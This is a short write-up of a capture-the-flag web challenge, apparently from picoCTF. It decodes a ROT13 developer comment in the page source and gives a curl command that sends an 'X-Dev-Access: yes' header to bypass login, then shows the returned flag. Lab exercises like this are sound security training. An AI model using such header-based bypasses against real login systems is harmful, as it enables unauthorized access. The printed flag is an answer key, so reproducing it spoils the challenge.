# Overview
When entering the website, a login page appears  
<img width="400" height="250" alt="image" src="https://github.com/user-attachments/assets/48daae86-9317-4867-b187-33f8962fc500" />  
**Hint 1**: Developers sometimes leave notes in the code; but not always in plain text.  
**Hint 2**: A common trick is to rotate each letter by 13 positions in the alphabet.

The website has provided us with an email and our job is to log in with this email  
Email: ctf-player@picoctf.org  
  
`Ctr+U` to view the page source, we see that the developer left a comment that should probably be deleted  
<img width="400" height="250" alt="image" src="https://github.com/user-attachments/assets/52d04548-5330-476e-811c-ca97fef00ecb" />  
  
`ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf` => This is a piece of code encoded with rot13  
After coding, this is the collected data: `NOTE: Jack - temporary bypass: use header "X-Dev-Access: yes"`  

# Writeup
You can use burpsuite to capture requests and send them or you can use Curl to send requests.  
In this case, I use Curl  
`curl -X POST http://amiable-citadel.picoctf.net:YourPost/login -H "Content-Type: application/json" -H "X-Dev-Access: yes" -d '{"email":"ctf-player@picoctf.org","password":"123"}'`  

Flag will be returned  
`{"success":true,"email":"ctf-player@picoctf.org","firstName":"pico","lastName":"player","flag":"picoCTF{brut4_f0rc4_cbb8faa7}"}`



